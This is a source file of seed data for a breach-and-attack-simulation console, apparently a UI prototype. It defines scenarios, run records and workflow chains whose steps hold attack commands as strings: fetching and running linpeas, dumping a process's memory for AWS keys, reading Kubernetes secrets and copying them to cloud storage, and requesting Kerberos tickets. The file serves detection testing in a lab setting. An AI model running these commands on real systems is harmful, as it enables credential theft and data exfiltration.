/**
 * Scenarios, chains, workflows, run records and lane geometry.
 *
 * SEED CATALOG — carried over verbatim from the design prototype
 * (`POVengine Console.dc.html`, Claude Design project "Cortex POV Engine UI
 * Redesign"; see docs/design/DESIGN-SYNC.md).
 *
 * These are the authored corpus values the design was drawn against. Where
 * SimCore serves the same shape over the API, the surface prefers the API and
 * falls back to this; where it does not serve it yet, this IS the model, and
 * its shape is what the endpoint should eventually return. Do not "improve"
 * values here to make a screen look better — they are the numbers the design
 * conversation settled on, and several of them are quoted on more than one
 * surface precisely so those surfaces cannot disagree.
 */

export const SCENARIOS = [
  ['SIM-EDR-001', 'Service-account credential theft → cloud exfil', 'EDR', 'T1003.001', 'AGT', 7, 11, 'pass'],
  ['SIM-CDR-014', 'Container runtime exec → K8s secret exfil', 'CDR', 'T1610', 'CC', 9, 14, 'pass'],
  ['SIM-ANL-021', 'Multi-plane stitch: cloud → endpoint → egress', 'ANALYTICS', 'T1078', 'ENG', 11, 18, 'never'],
  ['SIM-ITDR-009', 'Kerberoast → golden ticket forge', 'ITDR', 'T1558.003', 'DC', 8, 12, 'fail'],
  ['SIM-NDR-004', 'DNS tunnel beacon over EAL', 'NDR', 'T1071.004', 'BVM', 5, 7, 'pass'],
  ['SIM-KOI-003', 'VSCode extension reads AWS credentials', 'KOI', 'T1195.002', 'AGT', 6, 9, 'never'],
  ['SIM-AIRS-002', 'Prompt injection → system-prompt leak', 'AIRS', 'LLM01', 'DC', 4, 5, 'never'],
  ['SIM-DLP-005', 'Staged archive to personal cloud storage', 'DLP', 'T1567.002', 'AGT', 5, 6, 'pass'],
  ['SIM-ASM-001', 'Exposed management surface discovery', 'ASM', 'T1595', 'CC', 4, 6, 'never'],
]

export const CHAIN = [
  ['s01', 'Stage discovery tool on the host', 'EDR', 'T1592', 'www-data', 'AGT', ['BIOC'], 'CONFIRMED', 'agent step', 'command -v curl && curl -fsS http://simcore:8888/api/payloads/linpeas \\\n  -o /tmp/.cache/sysinfo.sh && chmod +x /tmp/.cache/sysinfo.sh'],
  ['s02', 'Enumerate service accounts and tokens', 'ITDR', 'T1087.001', 'www-data', 'AGT', ['XQL', 'BIOC'], 'CONFIRMED', 'agent step', '/tmp/.cache/sysinfo.sh -q | tee /tmp/.cache/enum.out'],
  ['s03', 'Read broker credential out of process memory', 'EDR', 'T1003.001', 'root', 'AGT', ['ABIOC', 'BIOC'], 'CONFIRMED', 'agent step', 'gcore -o /tmp/.cache/dump $(pgrep -f cortex-broker | head -1)\nstrings /tmp/.cache/dump.* | grep -Eo "AKIA[0-9A-Z]{16}"'],
  ['s04', 'Assume a cloud role with the stolen key', 'CDR', 'T1078.004', 'svc-backup', 'CC', ['Correlation', 'XQL'], 'BROKEN', 'agent step', 'aws sts assume-role --role-arn $ROLE --role-session-name backup-svc'],
  ['s05', 'Pull bucket objects to an external endpoint', 'CDR', 'T1567.002', 'node', 'CC', ['XQL'], 'EXPECTED', 'agent step', 'aws s3 sync s3://acme-fin-reports /tmp/.cache/out --quiet'],
  ['s06', 'Confirm the egress channel (EAL emitter)', 'NDR', 'T1071.004', 'n/a', 'BVM', [], 'EXPECTED', 'eal emitter', 'python -m eal_simulator.cli run dns_tunnel.yml --live'],
]

/* Lane catalog — one band per Cortex ingestion door. A run only draws the
   lanes it actually touches, so a 2-source run is not padded out to six. */
export const LANE_CATALOG = [
  ['AGT', 'CORTEX AGENT', 'endpoint plane', 'rgba(0,192,232,.05)'],
  ['CC', 'CLOUD CONNECTOR', 'cloud plane', 'rgba(0,174,196,.05)'],
  ['BVM', 'BROKER VM / DATA', 'network plane', 'rgba(110,194,214,.05)'],
  ['DC', 'DATA CONNECTOR', 'third-party streams', 'rgba(199,170,71,.05)'],
  ['ENG', 'CORTEX ENGINE', 'analytics & alerts', 'rgba(250,88,45,.05)'],
]

export const RUN_SHAPES = {
  '4ee09860': {
    id: '4ee09860', scen: 'SIM-EDR-001', name: 'Service-account credential theft → cloud exfil',
    live: true, state: 'RUNNING', step: '4 / 7', dets: '6 / 11', mttd: '47s', chain: '71%', pending: '5',
    steps: [
      { id: 'a', col: 0, row: 0, lane: 'AGT', kind: 'CGO · process', label: 'bash 4102', state: 'confirmed' },
      { id: 'b', col: 1, row: 0, lane: 'AGT', kind: 'process', label: 'linpeas.sh', state: 'confirmed', from: ['a'] },
      { id: 'c', col: 2, row: 0, lane: 'AGT', kind: 'process', label: 'gcore → dump', state: 'confirmed', from: ['b'] },
      { id: 'd', col: 3, row: 0, lane: 'CC', kind: 'cloud identity', label: 'sts:AssumeRole', state: 'broken', from: ['c'] },
      { id: 'e', col: 4, row: 0, lane: 'CC', kind: 'cloud object', label: 's3:Get ×412', state: 'expected', from: ['d'] },
      { id: 'f', col: 3, row: 0, lane: 'BVM', kind: 'egress', label: 'dns-tunnel :53', state: 'expected', from: ['c'] },
      { id: 'g', col: 1, row: 0, lane: 'ENG', kind: 'alert · BIOC', label: 'cred-read-mem', state: 'confirmed', from: ['b'] },
      { id: 'h', col: 2, row: 0, lane: 'ENG', kind: 'alert · ABIOC', label: 'svc-acct-anomaly', state: 'confirmed', from: ['c'] },
      { id: 'i', col: 3, row: 1, lane: 'ENG', kind: 'alert · Correlation', label: 'cross-plane-stitch', state: 'broken', from: ['d', 'f'] },
      { id: 'j', col: 4, row: 1, lane: 'ENG', kind: 'alert · XQL', label: 'bucket-exfil', state: 'expected', from: ['e'] },
    ],
  },
  a71b2c04: {
    id: 'a71b2c04', scen: 'SIM-CDR-014', name: 'Container runtime exec → K8s secret exfil',
    live: false, state: 'COMPLETE', step: '9 / 9', dets: '12 / 14', mttd: '82s', chain: '100%', pending: '2',
    steps: [
      { id: 'a', col: 0, row: 0, lane: 'CC', kind: 'k8s api', label: 'pods/exec', state: 'confirmed' },
      { id: 'b', col: 1, row: 0, lane: 'CC', kind: 'container', label: 'sh in nginx-7f', state: 'confirmed', from: ['a'] },
      { id: 'c', col: 2, row: 0, lane: 'CC', kind: 'secret read', label: 'get secrets ×6', state: 'confirmed', from: ['b'] },
      { id: 'd', col: 3, row: 0, lane: 'CC', kind: 'cloud object', label: 'gcs:write', state: 'confirmed', from: ['c'] },
      { id: 'e', col: 1, row: 0, lane: 'AGT', kind: 'node process', label: 'runc spawn', state: 'confirmed', from: ['a'] },
      { id: 'f', col: 2, row: 0, lane: 'ENG', kind: 'alert · BIOC', label: 'k8s-exec-shell', state: 'confirmed', from: ['b', 'e'] },
      { id: 'g', col: 3, row: 0, lane: 'ENG', kind: 'alert · Correlation', label: 'secret-then-egress', state: 'confirmed', from: ['c', 'd'] },
      { id: 'h', col: 4, row: 0, lane: 'ENG', kind: 'alert · XQL', label: 'bucket-write-anom', state: 'expected', from: ['d'] },
    ],
  },
  c0d93f17: {
    id: 'c0d93f17', scen: 'SIM-NDR-004', name: 'DNS tunnel beacon over EAL',
    live: false, state: 'FAILED', step: '3 / 5', dets: '2 / 7', mttd: '—', chain: '40%', pending: '0',
    steps: [
      { id: 'a', col: 0, row: 0, lane: 'DC', kind: 'eal emitter', label: 'dns_tunnel.yml', state: 'confirmed' },
      { id: 'b', col: 1, row: 0, lane: 'BVM', kind: 'syslog relay', label: 'broker :514', state: 'confirmed', from: ['a'] },
      { id: 'c', col: 2, row: 0, lane: 'BVM', kind: 'egress', label: 'txt queries ×2.1k', state: 'broken', from: ['b'] },
      { id: 'd', col: 3, row: 0, lane: 'ENG', kind: 'alert · XQL', label: 'dns-entropy', state: 'expected', from: ['c'] },
    ],
  },
}

/* Every execution this instance has performed. Re-running a workflow appends
   a record; it never overwrites, so two attempts of the same workflow can be
   compared — which is what lets a POV show that a tenant change mattered. */
export const RUN_LOG = [
  { id: '4ee09860', shapeKey: '4ee09860', name: 'Service-account credential theft → cloud exfil', scen: 'SIM-EDR-001', shape: '4 lanes · 10 nodes', started: 'today 17:41', steps: '4 / 7', dets: '6 / 11', mttd: '47s', wf: 'WF-0012 v4', by: 'dc-lead@acme', wall: '—', state: 'RUNNING' },
  { id: '7c22b910', shapeKey: '4ee09860', name: 'Service-account credential theft → cloud exfil', scen: 'SIM-EDR-001', shape: '4 lanes · 10 nodes', started: 'today 09:12', steps: '7 / 7', dets: '9 / 11', mttd: '38s', wf: 'WF-0012 v3', by: 'dc-lead@acme', wall: '6:12', state: 'COMPLETE' },
  { id: 'a71b2c04', shapeKey: 'a71b2c04', name: 'Container runtime exec → K8s secret exfil', scen: 'SIM-CDR-014', shape: '3 lanes · 8 nodes', started: '14 Sep 16:04', steps: '9 / 9', dets: '12 / 14', mttd: '82s', wf: 'WF-0008 v2', by: 'dc-lead@acme', wall: '8:41', state: 'COMPLETE' },
  { id: 'c0d93f17', shapeKey: 'c0d93f17', name: 'DNS tunnel beacon over EAL', scen: 'SIM-NDR-004', shape: '3 lanes · 4 nodes', started: '14 Sep 11:37', steps: '3 / 5', dets: '2 / 7', mttd: '—', wf: 'WF-0015 v1', by: 'se-partner@acme', wall: '2:18', state: 'FAILED' },
  { id: 'b1e4470a', shapeKey: 'a71b2c04', name: 'Container runtime exec → K8s secret exfil', scen: 'SIM-CDR-014', shape: '3 lanes · 8 nodes', started: '13 Sep 15:20', steps: '5 / 9', dets: '4 / 14', mttd: '104s', wf: 'WF-0008 v1', by: 'dc-lead@acme', wall: '4:02', state: 'ABORTED' },
  { id: 'd83f1c66', shapeKey: 'c0d93f17', name: 'DNS tunnel beacon over EAL', scen: 'SIM-NDR-004', shape: '3 lanes · 4 nodes', started: '12 Sep 10:02', steps: '5 / 5', dets: '2 / 7', mttd: '156s', wf: 'WF-0015 v1', by: 'dc-lead@acme', wall: '3:55', state: 'COMPLETE' },
]

/* Workflows own their chains. Node counts in the switcher are DERIVED from
   `chain`, so the list cannot advertise a number the canvas does not render. */
export const WORKFLOWS = [
  {
    id: 'WF-0012', name: 'Service-account credential theft → cloud exfil',
    version: 'v4', state: 'unsaved', touched: 'edited 2m ago',
    chain: CHAIN,
    cols: { trigger: 0, s01: 1, s02: 2, s03: 3, s04: 4, s05: 5, s06: 4, teardown: 6 },
    lanes: { trigger: 'LAUNCH', s01: 'AGT', s02: 'AGT', s03: 'AGT', s04: 'CC', s05: 'CC', s06: 'BVM', teardown: 'PROOF' },
    edges: [['trigger', 's01'], ['s01', 's02'], ['s02', 's03'], ['s03', 's04'], ['s04', 's05'], ['s03', 's06'], ['s05', 'teardown'], ['s06', 'teardown']],
  },
  {
    id: 'WF-0008', name: 'Container runtime exec → K8s secret exfil',
    version: 'v2', state: 'saved', touched: 'run 14 Sep',
    chain: [
      ['k01', 'Exec a shell into a running pod', 'CDR', 'T1610', 'svc-deploy', 'CC', ['BIOC'], 'CONFIRMED', 'api step', 'kubectl exec -it nginx-7f -- /bin/sh -c id'],
      ['k02', 'Enumerate mounted service-account tokens', 'CDR', 'T1552.007', 'svc-deploy', 'CC', ['XQL'], 'CONFIRMED', 'agent step', 'cat /var/run/secrets/kubernetes.io/serviceaccount/token'],
      ['k03', 'Read cluster secrets through the API', 'CDR', 'T1552.007', 'svc-deploy', 'CC', ['BIOC', 'ABIOC'], 'CONFIRMED', 'api step', 'kubectl get secrets -A -o json | head -c 4096'],
      ['k04', 'Write the archive to object storage', 'CDR', 'T1567.002', 'svc-deploy', 'CC', ['XQL', 'Correlation'], 'CONFIRMED', 'api step', 'gsutil cp /tmp/.cache/secrets.tgz gs://acme-backup-lab/'],
      ['k05', 'Confirm node-level process lineage', 'EDR', 'T1610', 'root', 'AGT', ['BIOC'], 'CONFIRMED', 'agent step', 'ps -ef | grep -E "runc|containerd-shim" | head'],
    ],
    cols: { trigger: 0, k01: 1, k02: 2, k03: 3, k04: 4, k05: 2, teardown: 5 },
    lanes: { trigger: 'LAUNCH', k01: 'CC', k02: 'CC', k03: 'CC', k04: 'CC', k05: 'AGT', teardown: 'PROOF' },
    edges: [['trigger', 'k01'], ['k01', 'k02'], ['k02', 'k03'], ['k03', 'k04'], ['k01', 'k05'], ['k04', 'teardown'], ['k05', 'teardown']],
  },
  {
    id: 'WF-0015', name: 'DNS tunnel over EAL (network plane only)',
    version: 'v1', state: 'draft', touched: 'never run',
    chain: [
      ['d01', 'Emit the tunnel shape from the EAL plugin', 'NDR', 'T1071.004', 'n/a', 'DC', ['XQL'], 'EXPECTED', 'eal emitter', 'python -m eal_simulator.cli run dns_tunnel.yml --live'],
      ['d02', 'Relay the stream through the Broker VM', 'NDR', 'T1071.004', 'n/a', 'BVM', [], 'EXPECTED', 'relay step', 'logger -n broker-relay-01 -P 514 -t dns-sim < /tmp/.cache/dns.log'],
      ['d03', 'Confirm entropy on the resolver path', 'NDR', 'T1071.004', 'n/a', 'BVM', ['XQL', 'BIOC'], 'EXPECTED', 'collector probe', 'dig +short $(head -1 /tmp/.cache/labels.txt).lab.example'],
    ],
    cols: { trigger: 0, d01: 1, d02: 2, d03: 3, teardown: 4 },
    lanes: { trigger: 'LAUNCH', d01: 'DC', d02: 'BVM', d03: 'BVM', teardown: 'PROOF' },
    edges: [['trigger', 'd01'], ['d01', 'd02'], ['d02', 'd03'], ['d03', 'teardown']],
  },
  {
    id: 'WF-0019', name: 'Windows identity chain (no harness)',
    version: 'v1', state: 'draft', touched: 'never run',
    chain: [
      ['w01', 'Sweep service principal names', 'ITDR', 'T1558.003', 'direct', 'AGT', ['BIOC'], 'EXPECTED', 'agent step', 'powershell -File C:\\Windows\\Temp\\spn-sweep.ps1'],
      ['w02', 'Request and export a service ticket', 'ITDR', 'T1558.003', 'direct', 'AGT', ['BIOC', 'ABIOC'], 'EXPECTED', 'agent step', 'klist get MSSQLSvc/db01.acme.local:1433'],
      ['w03', 'Present the forged ticket to a share', 'ITDR', 'T1550.003', 'direct', 'AGT', ['ABIOC'], 'EXPECTED', 'agent step', 'net use \\\\db01\\backups /user:svc-sql'],
      ['w04', 'Correlate identity misuse across hosts', 'ANALYTICS', 'T1078', 'n/a', 'ENG', ['Correlation'], 'EXPECTED', 'engine probe', 'povengine probe correlation --rule corr-itdr-009'],
    ],
    cols: { trigger: 0, w01: 1, w02: 2, w03: 3, w04: 4, teardown: 5 },
    lanes: { trigger: 'LAUNCH', w01: 'AGT', w02: 'AGT', w03: 'AGT', w04: 'ENG', teardown: 'PROOF' },
    edges: [['trigger', 'w01'], ['w01', 'w02'], ['w02', 'w03'], ['w03', 'w04'], ['w04', 'teardown']],
  },
]

export const WF_TONE = {
  saved: ['var(--pos-soft)', 'var(--pos)'],
  unsaved: ['rgba(255,203,6,.13)', 'var(--warn)'],
  draft: ['var(--s3)', 'var(--tx2)'],
}

/* Composer swimlanes — one band per area the simulation launches through.
   Keyed to LANE_CATALOG so the Composer and the Runs topology agree on doors:
   where a node sits on the design canvas IS the door it launches through, and
   dragging it into another band retargets it. */
export const COMPOSER_LANES = [
  ['LAUNCH', 'LAUNCH', 'scope · tenant & agent', 76, 'rgba(255,255,255,.02)'],
  ['AGT', 'ENDPOINT', 'Cortex Agent', 104, 'rgba(0,192,232,.05)'],
  ['CC', 'CLOUD', 'Cortex Cloud Connector', 104, 'rgba(0,174,196,.05)'],
  ['BVM', 'NETWORK', 'Broker VM relay', 104, 'rgba(110,194,214,.05)'],
  ['DC', 'DATA STREAMS', 'Cortex Data Connector', 104, 'rgba(199,170,71,.05)'],
  ['ENG', 'ANALYTICS', 'Cortex Engine', 104, 'rgba(250,88,45,.05)'],
  ['PROOF', 'PROOF', 'teardown & report', 76, 'rgba(255,255,255,.02)'],
]

export const LANE_BANDS = (() => {
  let y = 0
  return COMPOSER_LANES.map(([key, label, sub, h, fill]) => {
    const band = { key, label, sub, h, fill, top: y, nodeY: y + 5 }
    y += h
    return band
  })
})()
export const STAGE_H = LANE_BANDS.reduce((a, b) => a + b.h, 0)
export const COL_X = 136, COL_PITCH = 212, STAGE_W = COL_X + 7 * COL_PITCH + 30

// Default placement for any workflow: column pitch across, lane band down.
export function layoutFor(wf) {
  const out = {}
  Object.keys(wf.cols).forEach((id) => {
    const band = LANE_BANDS.find((b) => b.key === wf.lanes[id]) || LANE_BANDS[0]
    out[id] = { x: COL_X + wf.cols[id] * COL_PITCH, y: band.nodeY }
  })
  return out
}
// Everything this ephemeral instance has accumulated. The app dies with the
